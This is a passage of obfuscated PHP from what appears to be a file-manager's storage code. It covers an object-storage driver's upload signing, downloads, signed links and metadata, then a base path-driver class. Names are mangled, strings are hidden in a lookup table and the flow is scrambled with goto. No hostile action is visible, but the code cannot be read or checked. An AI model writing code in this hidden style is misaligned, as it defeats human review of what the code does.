$Bøğ¹œÑ‰š[232], $E“‡»±‰íè); return $D¨ÏëÒ‰‰[$Bøğ¹œÑ‰š[1059]] ? $this->getPathOuter($aÊ­ÑïØñŒ) : !1; } goto EÅÒ”³Ş›Ÿ; Aé…•‚‰§Á: } private function uploadPart($bÎà‡›œÁ¦, $aºÓĞ¿Áî, &$A†óé‹¿í‰) { $cñÅê”ó¨ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bğôÇ°‚Å = array($cñÅê”ó¨[1296], $cñÅê”ó¨[1294] . $aºÓĞ¿Áî[$cñÅê”ó¨[1295]], $cñÅê”ó¨[1297] . $aºÓĞ¿Áî[$cñÅê”ó¨[1291]], $cñÅê”ó¨[138] . $aºÓĞ¿Áî[$cñÅê”ó¨[1292]]); $Cç½˜åµ´ã = $this->ussRequest($bÎà‡›œÁ¦, $cñÅê”ó¨[232], $A†óé‹¿í‰, $bğôÇ°‚Å); return !$Cç½˜åµ´ã[$cñÅê”ó¨[1059]] ? $Cç½˜åµ´ã[$cñÅê”ó¨[1059]] : $Cç½˜åµ´ã[$cñÅê”ó¨[1061]]; } public function uploadFormData($c¸­­©ƒƒÆ, $däÈÑ‹¬Ó¥ = 3600) { return $this->uploadPolicy($c¸­­©ƒƒÆ, $däÈÑ‹¬Ó¥); } public function multiUploadFormData($eƒóŞŸ¿í‡, $aËç¯—ğÌ‚ = 3600) { $A¾ÃåØ·‰– =& $_SERVER[åÌÛ»ô¢‚ö™]; $aÚ¶‹¥å×ª = (int) $GLOBALS[$A¾ÃåØ·‰–[7]][$A¾ÃåØ·‰–[77]]; return $this->uploadPolicy($eƒóŞŸ¿í‡, $aËç¯—ğÌ‚, $aÚ¶‹¥å×ª); } private function uploadPolicy($B–¥»ÈÑª, $Eİ‘¼’»„Š = 3600, $AæÇ‘«²á™ = 0) { goto A¿ª¢ùÂ“ç; A¿ª¢ùÂ“ç: $aËãœáÂ¦ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a²¶¨ÑîÛ = $aËãœáÂ¦[8] . $this->bucket; $B™ÚİğÀ¾ = gmdate($aËãœáÂ¦[1232]); goto E™÷·ÊèÊâ; E™÷·ÊèÊâ: $EÆ¿†„õ¿ø = array($aËãœáÂ¦[1298] => $this->bucket, $aËãœáÂ¦[1299] => $B–¥»ÈÑª, $aËãœáÂ¦[1300] => time() + $Eİ‘¼’»„Š, $aËãœáÂ¦[1301] => $B™ÚİğÀ¾); if ($AæÇ‘«²á™) { $EÆ¿†„õ¿ø[$aËãœáÂ¦[1211]] = $AæÇ‘«²á™; } $DáÉ¹‰Îš¹ = base64_encode(json_encode($EÆ¿†„õ¿ø)); goto cŒ‚«İ–³Ù; cŒ‚«İ–³Ù: $cö°ªÚ‰Š© = base64_encode(hash_hmac($aËãœáÂ¦[1268], "\120\117\123\x54\46{$a²¶¨ÑîÛ}\46{$B™ÚİğÀ¾}\x26{$DáÉ¹‰Îš¹}", md5("{$this->userpass}"), !0)); $C¦œÊÉÒ«É = array($aËãœáÂ¦[1138] => $DáÉ¹‰Îš¹, $aËãœáÂ¦[1302] => "\125\120\131\x55\x4e\40{$this->username}\x3a{$cö°ªÚ‰Š©}", $aËãœáÂ¦[173] => $this->endpoint . $a²¶¨ÑîÛ); return $C¦œÊÉÒ«É; goto fìÊŸ³Çõ; fìÊŸ³Çõ: } public function download($d¼‹ÃÆ‚À, $AñÔåÆô‰) { goto cÔÕò»Á‚; A¨ÛøÆ²äó: fclose($C•Şá’Ö­µ); return $AñÔåÆô‰; goto DĞª ³ôê; DÊ‘Ù®î: $Fåğõí„ = 1024 * 200; $C•Şá’Ö­µ = fopen($D“„ìœ³Î, $_SERVER[åÌÛ»ô¢‚ö™][1252]); while (!0) { $FŠĞ¿«˜Ë† = $this->fileSubstr($d¼‹ÃÆ‚À, $böäİ‚¢‚, $Fåğõí„); if ($FŠĞ¿«˜Ë† === !1) { return !1; } fwrite($C•Şá’Ö­µ, $FŠĞ¿«˜Ë†); $böäİ‚¢‚ += $Fåğõí„; if (strlen($FŠĞ¿«˜Ë†) < $Fåğõí„) { break; } } goto A¨ÛøÆ²äó; cÔÕò»Á‚: $D“„ìœ³Î = IO::getPathInner(IO::mkfile($AñÔåÆô‰)); if (!($cáŞ°òƒòÉ = $this->link($d¼‹ÃÆ‚À))) { return !1; } $böäİ‚¢‚ = 0; goto DÊ‘Ù®î; DĞª ³ôê: } public function link($c§¢ëØ»¤, $C½ó¯ïƒÖÏ = array()) { $A†”–™ÏËÛ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c§¢ëØ»¤ = trim($c§¢ëØ»¤, $A†”–™ÏËÛ[8]); if (!empty($this->token)) { $BáŸòñŒÀ = strtotime(date($A†”–™ÏËÛ[1303])); $d°‡Á˜Äˆ = substr(md5($this->token . $A†”–™ÏËÛ[287] . $BáŸòñŒÀ . $A†”–™ÏËÛ[1304] . $c§¢ëØ»¤), 12, 8) . $BáŸòñŒÀ; $C½ó¯ïƒÖÏ[] = $A†”–™ÏËÛ[1305] . $d°‡Á˜Äˆ; } $cÀ‡êÕ´É = !empty($C½ó¯ïƒÖÏ) ? $A†”–™ÏËÛ[69] . implode($A†”–™ÏËÛ[287], $C½ó¯ïƒÖÏ) : $A†”–™ÏËÛ[33]; return $this->getHost() . $A†”–™ÏËÛ[8] . $c§¢ëØ»¤ . $cÀ‡êÕ´É; } public function fileOut($BñÊŒâ™œ™, $bÚ†­‚Ôˆ = false, $Fì×ŞİÚ÷Ë = false, $AÌ‡¸ï¡¤ö = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($BñÊŒâ™œ™, $bÚ†­‚Ôˆ, $Fì×ŞİÚ÷Ë, $AÌ‡¸ï¡¤ö); } if (!$Fì×ŞİÚ÷Ë) { $Fì×ŞİÚ÷Ë = $this->pathThis($BñÊŒâ™œ™); } $EîÕ„¹Á©Ú = $bÚ†­‚Ôˆ ? array($_SERVER[åÌÛ»ô¢‚ö™][1306] . rawurlencode($Fì×ŞİÚ÷Ë)) : array(); $a‚®î¹¦Èª = $this->link($BñÊŒâ™œ™, $EîÕ„¹Á©Ú); $this->fileOutLink($a‚®î¹¦Èª); } public function fileOutServer($F‘±è¡—Ô, $d·êÖé”©ö = false, $cß†ï¤Èï· = false, $e±àÜ÷›ö = '') { parent::fileOut($F‘±è¡—Ô, $d·êÖé”©ö, $cß†ï¤Èï·, $e±àÜ÷›ö); } public function fileOutImage($A¿©ò´ƒ, $câã¾ìƒì¥ = 250) { $aÏĞÄ…‚‘× = $this->link($A¿©ò´ƒ . $_SERVER[åÌÛ»ô¢‚ö™][1307] . $câã¾ìƒì¥); $this->fileOutLink($aÏĞÄ…‚‘×); } public function fileOutImageServer($a‘†¹İßªê, $bŒ•™ÜÁ = 250) { parent::fileOutImage($a‘†¹İßªê, $bŒ•™ÜÁ); } public function hashMd5($C©ø«·äìº) { $eÉ‹°½† =& $_SERVER[åÌÛ»ô¢‚ö™]; $e¶­‘Œ¢µğ = $this->_objectMeta($C©ø«·äìº); return isset($e¶­‘Œ¢µğ[$eÉ‹°½†[214]]) ? $e¶­‘Œ¢µğ[$eÉ‹°½†[214]] : !1; } public function size($D«»Ç¥ÇÑ) { $dÏ‡ì•º½ = $this->objectMeta($D«»Ç¥ÇÑ); return $dÏ‡ì•º½ ? $dÏ‡ì•º½[$_SERVER[åÌÛ»ô¢‚ö™][77]] : 0; } public function info($aß…İ²—¥ñ) { if ($this->isFolder($aß…İ²—¥ñ)) { return $this->folderInfo($aß…İ²—¥ñ); } else { if ($this->isFile($aß…İ²—¥ñ)) { return $this->fileInfo($aß…İ²—¥ñ); } } return !1; } public function exist($e ùòÁ§’) { return $this->isFile($e ùòÁ§’) || $this->isFolder($e ùòÁ§’); } public function isFile($dÈ‚•ì‚) { return !$this->isFolder($dÈ‚•ì‚) && $this->objectMeta($dÈ‚•ì‚); } public function isFolder($fµîğ˜¬É) { return $this->cacheMethod($_SERVER[åÌÛ»ô¢‚ö™][205], $fµîğ˜¬É); } protected function objectMeta($BÊŠ–ééùÇ) { return $this->cacheMethod($_SERVER[åÌÛ»ô¢‚ö™][206], $BÊŠ–ééùÇ); } protected function _objectMeta($E¤¥Ğêä¬) { goto c’åğàª§‘; b‚˜‘ï·¹Ü: if (!$bÆÉÍ°ÈëÓ[$bÅÉÙË®ì…[1059]]) { return null; } $D÷Êï²–ù = isset($bÆÉÍ°ÈëÓ[$bÅÉÙË®ì…[1061]]) ? $bÆÉÍ°ÈëÓ[$bÅÉÙË®ì…[1061]] : array(); if (!isset($D÷Êï²–ù[$bÅÉÙË®ì…[1309]])) { return null; } goto e‘Ãó™Ü³Ã; c’åğàª§‘: $bÅÉÙË®ì… =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($E¤¥Ğêä¬ == $bÅÉÙË®ì…[33] || $E¤¥Ğêä¬ == $bÅÉÙË®ì…[8]) { return array(); } $bÆÉÍ°ÈëÓ = $this->ussRequest($E¤¥Ğêä¬, $bÅÉÙË®ì…[1308]); goto b‚˜‘ï·¹Ü; e‘Ãó™Ü³Ã: $CÎŸÈ²æ¸¨ = array($bÅÉÙË®ì…[29] => isset($D÷Êï²–ù[$bÅÉÙË®ì…[1309]]) ? $D÷Êï²–ù[$bÅÉÙË®ì…[1309]] : null, $bÅÉÙË®ì…[77] => isset($D÷Êï²–ù[$bÅÉÙË®ì…[1310]]) ? $D÷Êï²–ù[$bÅÉÙË®ì…[1310]] : null, $bÅÉÙË®ì…[214] => isset($D÷Êï²–ù[$bÅÉÙË®ì…[1311]]) ? $D÷Êï²–ù[$bÅÉÙË®ì…[1311]] : null, $bÅÉÙË®ì…[1278] => isset($D÷Êï²–ù[$bÅÉÙË®ì…[1312]]) ? $D÷Êï²–ù[$bÅÉÙË®ì…[1312]] : null); $CÎŸÈ²æ¸¨[$bÅÉÙË®ì…[1279]] = isset($D÷Êï²–ù[$bÅÉÙË®ì…[1313]]) ? strtotime($D÷Êï²–ù[$bÅÉÙË®ì…[1313]]) : $CÎŸÈ²æ¸¨[$bÅÉÙË®ì…[1278]]; return $CÎŸÈ²æ¸¨; goto A´ŠêŸ©Øğ; A´ŠêŸ©Øğ: } protected function _isFolder($A“œ¯¨»¡Å) { $B°ÉÔ¯‡‹³ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($A“œ¯¨»¡Å == $B°ÉÔ¯‡‹³[33] || $A“œ¯¨»¡Å == $B°ÉÔ¯‡‹³[8]) { return !0; } $Cç¼»‰»ÇŠ = $this->objectMeta($A“œ¯¨»¡Å); return isset($Cç¼»‰»ÇŠ[$B°ÉÔ¯‡‹³[29]]) && $Cç¼»‰»ÇŠ[$B°ÉÔ¯‡‹³[29]] == $B°ÉÔ¯‡‹³[76] ? !0 : !1; } } goto eˆÁ˜Äƒ¢Æ; F’“Ûø¹»¾: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $bå¹¶¿‹Š¯ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->objectDriver = array($bå¹¶¿‹Š¯[57], $bå¹¶¿‹Š¯[58], $bå¹¶¿‹Š¯[59], $bå¹¶¿‹Š¯[60], $bå¹¶¿‹Š¯[61], $bå¹¶¿‹Š¯[62], $bå¹¶¿‹Š¯[63], $bå¹¶¿‹Š¯[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($cÔÃ¹±ñ¤) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($cÔÃ¹±ñ¤, $_SERVER[åÌÛ»ô¢‚ö™][8]); } return $cÔÃ¹±ñ¤; } public function getPathName($döá•Ôèˆ) { return $döá•Ôèˆ; } public function iconvApp($eëßŠÓÛ¤Ì) { return $eëßŠÓÛ¤Ì; } public function iconvSystem($dœ¤‡Öº‘‡) { return $dœ¤‡Öº‘‡; } public function iconvTo($c½ãŞˆìñÔ, $bøğ÷äó, $Bœ†—íï½) { goto e¨ÈŒÓ‰Äó; D¥‘²”¿ğ: return $eàõÙ³êËÄ; goto fÁÑÂîâ; cøİŞ×Ò¤ø: $BÖˆÍÁäÖ[$Bœ†—íï½ . $a¹ã†¾¯[66] . $bøğ÷äó . $a¹ã†¾¯[67] . $c½ãŞˆìñÔ] = $c½ãŞˆìñÔ; $BÖˆÍÁäÖ[$Bœ†—íï½ . $a¹ã†¾¯[66] . $bøğ÷äó . $a¹ã†¾¯[67] . $eàõÙ³êËÄ] = $c½ãŞˆìñÔ; $BÖˆÍÁäÖ[$bøğ÷äó . $a¹ã†¾¯[66] . $Bœ†—íï½ . $a¹ã†¾¯[67] . $eàõÙ³êËÄ] = $eàõÙ³êËÄ; goto D¥‘²”¿ğ; f®ËàØµ¹Œ: $eàõÙ³êËÄ = $eàõÙ³êËÄ ? $eàõÙ³êËÄ : $c½ãŞˆìñÔ; if (strstr($eàõÙ³êËÄ, $a¹ã†¾¯[69])) { $eàõÙ³êËÄ = str_replace($a¹ã†¾¯[69], $a¹ã†¾¯[70], $eàõÙ³êËÄ); } $BÖˆÍÁäÖ[$bøğ÷äó . $a¹ã†¾¯[66] . $Bœ†—íï½ . $a¹ã†¾¯[67] . $c½ãŞˆìñÔ] = $eàõÙ³êËÄ; goto cøİŞ×Ò¤ø; dä…ø£¤ï¿: $CÒì£œÉã‘ = $bøğ÷äó . $a¹ã†¾¯[66] . $Bœ†—íï½ . $a¹ã†¾¯[67] . $c½ãŞˆìñÔ; if (isset($BÖˆÍÁäÖ[$CÒì£œÉã‘])) { return $BÖˆÍÁäÖ[$CÒì£œÉã‘]; } if (function_exists($a¹ã†¾¯[68])) { $eàõÙ³êËÄ = @mb_convert_encoding($c½ãŞˆìñÔ, $Bœ†—íï½, $bøğ÷äó); } else { $eàõÙ³êËÄ = @iconv($bøğ÷äó, $Bœ†—íï½, $c½ãŞˆìñÔ); } goto f®ËàØµ¹Œ; e¨ÈŒÓ‰Äó: $a¹ã†¾¯ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$c½ãŞˆìñÔ || !function_exists($a¹ã†¾¯[65])) { return $c½ãŞˆìñÔ; } static $BÖˆÍÁäÖ = array(); goto dä…ø£¤ï¿; fÁÑÂîâ: } public function getPathInner($C×ÂõôìĞ) { $CÊêùÇò« = IO::init($C×ÂõôìĞ); return $CÊêùÇò«->path; } public function getPathOuter($eÇ‚ó£À’…) { $C–ƒ¾İùñ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eŠ Ê˜ó’ = strlen(trim($this->pathBase, $C–ƒ¾İùñ[8])); $eÇ‚ó£À’… = substr(trim($eÇ‚ó£À’…, $C–ƒ¾İùñ[8]), $eŠ Ê˜ó’); return $this->pathDriver . $C–ƒ¾İùñ[8] . ltrim($eÇ‚ó£À’…, $C–ƒ¾İùñ[8]); } public function isParentOf($B¤˜Í‡Î²², $dİ£öÇ«Ç) { $a­… ´ÊªÏ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B¤˜Í‡Î²² = rtrim(strtolower($B¤˜Í‡Î²²), $a­… ´ÊªÏ[8]) . $a­… ´ÊªÏ[8]; $dİ£öÇ«Ç = rtrim(strtolower($dİ£öÇ«Ç), $a­… ´ÊªÏ[8]) . $a­… ´ÊªÏ[8]; $cğ‡™²È£ = strpos($dİ£öÇ«Ç, $B¤˜Í‡Î²²) === 0; return $cğ‡™²È£; } public function getType() { $c°Öá’Å²µ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dš‰Í¡ø‘ï = str_replace($c°Öá’Å²µ[71], $c°Öá’Å²µ[33], get_class($this)); return strtolower($dš‰Í¡ø‘ï); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($D‹‰µêİè, $fÓ¼‘Øòõ) { $Cä­—ºœÎ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aš¡¡–ò¦õ = rtrim($D‹‰µêİè, $Cä­—ºœÎ[8]) . $Cä­—ºœÎ[8] . $fÓ¼‘Øòõ; $D‹‹èˆ¤è = $this->exist($aš¡¡–ò¦õ); return $D‹‹èˆ¤è ? $aš¡¡–ò¦õ : !1; } public function setModifyTime($C™¨™á˜º, $cá§¸Š¬ëë = '') { } public function renameObject($C±êìÉ×‡, $Eµ¼Öõ¬ã) { goto aÅÂöèìß; a…±½‰Œâ: return $DÃˆãÈĞºØ ? $Eµ¼Öõ¬ã : !1; goto cŸô¦‹—‘; aÅÂöèìß: $aïÇÄ¢Áª =& $_SERVER[åÌÛ»ô¢‚ö™]; $EŞØ×¯‘åÈ = $Eµ¼Öõ¬ã; Hook::trigger($aïÇÄ¢Áª[72], $this, $C±êìÉ×‡, $this, $this->pathFather($C±êìÉ×‡) . $Eµ¼Öõ¬ã); goto a­‡×¡ä›Á; a­‡×¡ä›Á: $C±êìÉ×‡ = $this->getPathOuter($C±êìÉ×‡); $Eµ¼Öõ¬ã = $this->pathFather($C±êìÉ×‡) . $Eµ¼Öõ¬ã; if (IO::isFile($C±êìÉ×‡)) { $DÃˆãÈĞºØ = IO::copy($C±êìÉ×‡, $this->pathFather($C±êìÉ×‡), REPEAT_RENAME_FOLDER, $EŞØ×¯‘åÈ); if ($DÃˆãÈĞºØ) { IO::remove($C±êìÉ×‡); } } else { $DÃˆãÈĞºØ = IO::mkdir($Eµ¼Öõ¬ã); if (!$DÃˆãÈĞºØ) { return !1; } $b»ŞÇÃî = IO::listPath($C±êìÉ×‡, !0); $fÎÓÎĞ¨ø = array_merge($b»ŞÇÃî[$aïÇÄ¢Áª[73]], $b»ŞÇÃî[$aïÇÄ¢Áª[74]]); foreach ($fÎÓÎĞ¨ø as $A˜Á¼†ÛùØ) { IO::move($A˜Á¼†ÛùØ[$aïÇÄ¢Áª[75]], $Eµ¼Öõ¬ã, REPEAT_RENAME_FOLDER); } IO::remove($C±êìÉ×‡); } goto a…±½‰Œâ; cŸô¦‹—‘: } public function tempFile($c°¢ÇÛ¼¡ = '', $AÊ ŠÒ¯Ì® = '') { goto AŸ›„†…½©; bÕ£©â¹ß: $c©È©¼É×· = $E…ƒèÉÒØŒ . $c°¢ÇÛ¼¡; @touch($c©È©¼É×·); if ($AÊ ŠÒ¯Ì®) { file_put_contents($c©È©¼É×·, $AÊ ŠÒ¯Ì®); } goto A™ŠÑÖöŞ©; A™ŠÑÖöŞ©: return $c©È©¼É×·; goto eâğ–ì‹Óµ; AŸ›„†…½©: if (!$c°¢ÇÛ¼¡) { $c°¢ÇÛ¼¡ = rand_string(15); } $E…ƒèÉÒØŒ = TEMP_FILES . rand_string(15) . $_SERVER[åÌÛ»ô¢‚ö™][8]; @mkdir($E…ƒèÉÒØŒ, 511, !0); goto bÕ£©â¹ß; eâğ–ì‹Óµ: } public function tempFileRemve($Eœ¼ƒ”ÙÉÉ) { @unlink($Eœ¼ƒ”ÙÉÉ); @rmdir($this->pathFather($Eœ¼ƒ”ÙÉÉ)); } public function mkfile($CàÑš´Æ¢³, $b¾·«›‰ĞÕ = '', $E¾øêæ‹Åó = REPEAT_RENAME) { } public function mkdir($D›Èè¥„Á, $dåáÍ¬Ş–¾ = REPEAT_SKIP) { } public function delFile($aÈÍÙŒ¶½Œ) { } public function delFolder($aÂÉáŠå¸¦) { } public function copyFile($F²òçÆä Ù, $C˜¶„¼˜äè) { } public function moveFile($A©ÉÈß¤õ™, $aÊ–•Í…‚Š) { } public function remove($aÔ«Ì…Ñ¤¡) { if ($this->isFile($aÔ«Ì…Ñ¤¡)) { return $this->delFile($aÔ«Ì…Ñ¤¡); } return $this->delFolder($aÔ«Ì…Ñ¤¡); } public function rename($CÖÍÌ­ƒÚ—, $eœÔïÁ‡æô) { } public function exist($b’¯—áÊ»Ø) { } public function findByHash($AèîÛ…“à = '', $BÌºÈ¤«àœ = '') { return !1; } public function isFile($cÊÁé–§ùù) { } public function isFolder($dİöÀ‹—‚†) { } public function size($bàä÷ò–š–) { } public function info($dŞÈãŸğÔ¹) { } public function infoSimple($FùÚ«‰¦÷À) { return $this->info($FùÚ«‰¦÷À); } public function infoAuth($Eğ·’ğ•) { return $this->info($Eğ·’ğ•); } public function infoFull($a¡Ñ™Ç×­ô) { return $this->info($a¡Ñ™Ç×­ô); } public function infoWithChildren($e¾É÷ôÖÅ) { $f™Êõ„ä“ =& $_SERVER[åÌÛ»ô¢‚ö™]; static $DÊ¥ë§õÑ = array(); if (isset($DÊ¥ë§õÑ[$e¾É÷ôÖÅ])) { return $DÊ¥ë§õÑ[$e¾É÷ôÖÅ]; } $bä›Ú‚Õ = $this->info($e¾É÷ôÖÅ); if ($bä›Ú‚Õ && $bä›Ú‚Õ[$f™Êõ„ä“[29]] == $f™Êõ„ä“[76]) { $c£…ÍÚ‡Øë = array($f™Êõ„ä“[77] => 0, $f™Êõ„ä“[78] => 0, $f™Êõ„ä“[79] => 0); $this->infoChildren($e¾É÷ôÖÅ, $c£…ÍÚ‡Øë); $bä›Ú‚Õ[$f™Êõ„ä“[77]] = $c£…ÍÚ‡Øë[$f™Êõ„ä“[77]]; $bä›Ú‚Õ[$f™Êõ„ä“[80]] = array($f™Êõ„ä“[81] => $c£…ÍÚ‡Øë[$f™Êõ„ä“[78]], $f™Êõ„ä“[82] => $c£…ÍÚ‡Øë[$f™Êõ„ä“[79]]); $DÊ¥ë§õÑ[$e¾É÷ôÖÅ] = $bä›Ú‚Õ; } return $bä›Ú‚Õ; } public function listPath($AÅñ³Ã½Ñ, $fòò½è‹ƒ = false) { } public function has($d–Ÿù¶ì¡ğ, $C…š§¿»¹ = false, $eà¯¹”¼ŸÏ = false) { } public function canRead($b…©õÏ·šœ) { } public function canWrite($bˆÌ‰Œø) { } public function getContent($b¸ÌØ¼Æï) { } public function setContent($dÃ¦Î‹ŠÜ, $DÂœº™ÔœË = '') { } protected function infoChildren($A »ä·Šã², &$CßŞäõ÷¸ï) { $B¯ÕêãĞ =& $_SERVER[åÌÛ»ô¢‚ö™]; check_abort(); $Eã´®ÊŒ¾ = $this->listPath($A »ä·Šã², !0); $Eã´®ÊŒ¾ = array_merge($Eã´®ÊŒ¾[$B¯ÕêãĞ[74]], $Eã´®ÊŒ¾[$B¯ÕêãĞ[73]]); foreach ($Eã´®ÊŒ¾ as $Dø¥îŒ©Œ‚) { if ($Dø¥îŒ©Œ‚[$B¯ÕêãĞ[29]] == $B¯ÕêãĞ[76]) { $CßŞäõ÷¸ï[$B¯ÕêãĞ[79]]++; $câ–©áÇ—§ = $this->getPathInner($Dø¥îŒ©Œ‚[$B¯ÕêãĞ[75]]); $this->infoChildren($câ–©áÇ—§, $CßŞäõ÷¸ï); } else { $CßŞäõ÷¸ï[$B¯ÕêãĞ[78]]++; $CßŞäõ÷¸ï[$B¯ÕêãĞ[77]] += $Dø¥îŒ©Œ‚[$B¯ÕêãĞ[77]]; } } } public function fileSubstr($e´‹é®•ğ, $eÆÂ†ø·áÚ, $CØ…–½Í) { } public function listAll($b’¯Œ¤Ë¢‰) { } public function upload($B…Ö¸ËÏ¬, $bÒõÚŒ”¿ï, $BÔíØíø¥— = false, $E•£Ú’ÄÒ• = REPEAT_REPLACE) { } public function uploadFileByID($eÏâã¬‰­Ü, $CÌôšùí¼õ, $B—æ®ÀÜ¾) { } public function uploadFileByPath($D¦æ®Øººİ, $CáŠ£‚Ş´ó, $Eğ¢Æ†©òŞ = array()) { } public function isUploadServer() { $CÔ¬ìÜ±è =& $_SERVER[åÌÛ»ô¢‚ö™]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $CÔ¬ìÜ±è[83]) { return !0; } return $GLOBALS[$CÔ¬ìÜ±è[6]][$CÔ¬ìÜ±è[84]][$CÔ¬ìÜ±è[85]]; } public function isFileOutServer() { $aÙŞ—”³Ô½ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $aÙŞ—”³Ô½[83]) { return !0; } return $GLOBALS[$aÙŞ—”³Ô½[6]][$aÙŞ—”³Ô½[84]][$aÙŞ—”³Ô½[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($d¯ŠÀ„Ï„¾) { $cÅÎ×ŸŠäö =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->isCdnHost()) { return $d¯ŠÀ„Ï„¾; } return str_replace(trim(get_url_root($d¯ŠÀ„Ï„¾), $cÅÎ×ŸŠäö[8]), trim($this->cdnHost, $cÅÎ×ŸŠäö[8]), $d¯ŠÀ„Ï„¾); } public function uploadLink($e•Œ‚¾ÌÅ», $d‚Ÿº¾®ó = 0) { goto E–º¹‹ƒ¬î; C¶·ãÊò: $FÈ”ÂùÜ‹¡ = $d‚Ÿº¾®ó <= $aéòÀÈëòÀ ? $B¸»ßˆÛ¸š[87] : $B¸»ßˆÛ¸š[88]; $B‹ŠÏ¿¤½ñ = (!$d‚Ÿº¾®ó ? 1 : ceil($d‚Ÿº¾®ó / pow(1024, 3))) * 3600 * 4; $c‹‹Ï©«Œ = $this->{$FÈ”ÂùÜ‹¡}($e•Œ‚¾ÌÅ», $B‹ŠÏ¿¤½ñ); goto fœãÎææ¬÷; fœãÎææ¬÷: if ($c‹‹Ï©«Œ) { $c‹‹Ï©«Œ[$B¸»ßˆÛ¸š[89]] = $e•Œ‚¾ÌÅ»; $c‹‹Ï©«Œ[$B¸»ßˆÛ¸š[90]] = $eØ—¦Æ˜ñù; } return $c‹‹Ï©«Œ; goto eÅğ‘èÉ‚¡; EàÇìÄŞÙ: if (!in_array($eØ—¦Æ˜ñù, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $aéòÀÈëòÀ = 1024 * 1024 * 10; goto C¶·ãÊò; E–º¹‹ƒ¬î: $B¸»ßˆÛ¸š =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->isUploadServer()) { return; } $eØ—¦Æ˜ñù = $this->getType(); goto EàÇìÄŞÙ; eÅğ‘èÉ‚¡: } public function uploadFormData($D‹©¾êÛñˆ, $fŒ‘£º¢…ç = 3600) { } public function multiUploadFormData($dŒíÜ¶á±ô, $cŒÜùö†ºä = 3600) { } public function download($Aê±È£‰å­, $D”’©ğˆ–õ) { } public function ext($bÀ¾äŠÔ•) { $d ¼©±÷­± =& $_SERVER[åÌÛ»ô¢‚ö™]; if (strpos($bÀ¾äŠÔ•, $d ¼©±÷­±[8]) === -1) { $DÈˆÃŠß‚­ = $bÀ¾äŠÔ•; } else { $DÈˆÃŠß‚­ = $this->pathThis($bÀ¾äŠÔ•); } $d¥Éá¯ùÜ = $d ¼©±÷­±[33]; if (strstr($DÈˆÃŠß‚­, $d ¼©±÷­±[91])) { $d¥Éá¯ùÜ = substr($DÈˆÃŠß‚­, strrpos($DÈˆÃŠß‚­, $d ¼©±÷­±[91]) + 1); $d¥Éá¯ùÜ = strtolower($d¥Éá¯ùÜ); } if (strlen($d¥Éá¯ùÜ) > 3 && preg_match($d ¼©±÷­±[92], $d¥Éá¯ùÜ, $F¢Òğ«æ®é)) { $d¥Éá¯ùÜ = $d ¼©±÷­±[33]; } return $d¥Éá¯ùÜ; } public function pathThis($FÖÉÚÄÊÍØ) { $A„¶¥Ãæ—Â =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÖÉÚÄÊÍØ = str_replace($A„¶¥Ãæ—Â[93], $A„¶¥Ãæ—Â[8], rtrim($FÖÉÚÄÊÍØ, $A„¶¥Ãæ—Â[8])); $FØ¤£‹›¨Ò = strrpos($FÖÉÚÄÊÍØ, $A„¶¥Ãæ—Â[8]); if ($FØ¤£‹›¨Ò === !1) { return $FÖÉÚÄÊÍØ; } return substr($FÖÉÚÄÊÍØ, $FØ¤£‹›¨Ò + 1); } public function pathFather($FËÛéÖ˜Šˆ) { $d†º·À“ÙŞ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FËÛéÖ˜Šˆ = str_replace($d†º·À“ÙŞ[93], $d†º·À“ÙŞ[8], rtrim($FËÛéÖ˜Šˆ, $d†º·À“ÙŞ[8])); $CƒƒÂåì÷ = strrpos($FËÛéÖ˜Šˆ, $d†º·À“ÙŞ[8]); if ($CƒƒÂåì÷ === !1) { return $d†º·À“ÙŞ[33]; } return substr($FËÛéÖ˜Šˆ, 0, $CƒƒÂåì÷ + 1); } public function hashSimple($BœÅÜ«ÊŒå) { goto Aã‘ùá–Ã•; cßĞÒ‘Ùˆä: $b®í¬‡½×é .= $this->fileSubstr($BœÅÜ«ÊŒå, $eÃØ»ßŸˆ - $CèóÀ°´ê•, $CèóÀ°´ê•); return md5($b®í¬‡½×é) . $eÃØ»ßŸˆ; goto dÂ‘óÁ³ÄÓ; cŠï°¹ø¡: $CÌœØàâè = intval($eÃØ»ßŸˆ / $Fƒğã¤òŠ–); $b®í¬‡½×é = $E±Ëğ¥§[33]; for ($fÏó˜ç¨ª = 0; $fÏó˜ç¨ª < $Fƒğã¤òŠ–; $fÏó˜ç¨ª++) { $b®í¬‡½×é .= $this->fileSubstr($BœÅÜ«ÊŒå, $CÌœØàâè * $fÏó˜ç¨ª, $CèóÀ°´ê•); } goto cßĞÒ‘Ùˆä; Aã‘ùá–Ã•: $E±Ëğ¥§ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$BœÅÜ«ÊŒå) { return md5($E±Ëğ¥§[33]); } $eÃØ»ßŸˆ = $this->size($BœÅÜ«ÊŒå); goto cº’‚‘°“‰; cº’‚‘°“‰: $CèóÀ°´ê• = 200; $Fƒğã¤òŠ– = 50; if ($eÃØ»ßŸˆ <= $CèóÀ°´ê• * $Fƒğã¤òŠ–) { return $this->hashMd5($BœÅÜ«ÊŒå) . $eÃØ»ßŸˆ; } goto cŠï°¹ø¡; dÂ‘óÁ³ÄÓ: } public static $md5Cache = array(); public function 